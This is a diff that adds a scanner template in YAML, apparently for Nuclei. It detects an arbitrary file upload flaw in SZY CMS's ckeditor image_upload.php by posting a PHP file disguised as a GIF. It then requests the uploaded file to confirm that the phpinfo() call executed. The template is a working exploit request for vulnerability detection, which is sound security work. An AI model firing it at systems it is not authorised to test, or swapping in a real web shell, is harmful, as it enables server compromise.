@@ -1,0 +1,51 @@
+id: szy-cms-image-upload-php-file-read
+info:
+  name: SZY CMS image_upload.php Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects arbitrary file upload vulnerability in SZY CMS via image_upload.php, allowing unauthorized users to upload PHP files and execute them.
+
+variables:
+  boundary: "------WebKitFormBoundary8UaANmWAgM4BqBSs"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/Common/ckeditor/plugins/multiimg/dialogs/image_upload.php"
+    headers:
+      Content-Type: "multipart/form-data;boundary={{boundary}}"
+    body: |
+      {{boundary}}
+      Content-Disposition: form-data; name="files"; filename="test.php"
+      Content-Type: image/gif
+
+      <?php phpinfo();?>
+      {{boundary}}--
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'imgurl')"
+    extractors:
+      - type: regex
+        name: url
+        group: 1
+        regex:
+          - "([0-9]{13}\\.php)"
+        internal: true
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Common/image/uploads/{{url}}"
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - "contains(body, 'PHP Version')"
+          - "contains(body, 'PHP API')"
+          - "contains(body, '<title>phpinfo()</title>')"
